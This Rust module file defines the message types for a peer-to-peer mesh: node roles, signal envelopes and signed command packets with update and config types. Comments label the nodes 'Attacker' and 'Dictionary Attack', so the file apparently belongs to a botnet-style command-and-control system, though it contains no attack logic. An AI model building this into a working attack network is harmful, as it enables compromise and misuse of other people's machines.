pub mod packet;
pub mod transport;
pub mod crypto;

#[derive(Debug, Clone, Copy, PartialEq, serde::Serialize, serde::Deserialize)]
pub enum NodeRole {
    Mesh,       // Public / Full Cone NAT -> Infrastructure
    Edge,       // Powerful PC behind NAT -> Attacker
    EdgeLight,  // Dictionary Attack / Weak Device -> Backup
}

pub use packet::{
    PhantomPacket, GhostPacket, CommandType, CommandPayload,
    MeshMsg, GossipMsg, Registration, AckPayload, PeerInfo, SignalMsg
};
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SignalEnvelope {
    pub sender_id: String, // Base58 PeerID
    pub timestamp: u64,
    pub targets: Vec<TargetPayload>,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TargetPayload {
    pub recipient_id: String,
    pub encrypted_data: Vec<u8>,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct CommandPacket {
    pub id: u64,              // Nonce
    pub type_: u8,            // 0=Ping, 1=Update, 2=Config...
    pub payload: Vec<u8>,
    pub signature: Vec<u8>,
}

pub use transport::PhantomTransport;
// pub mod quic; // Removed in V3.3
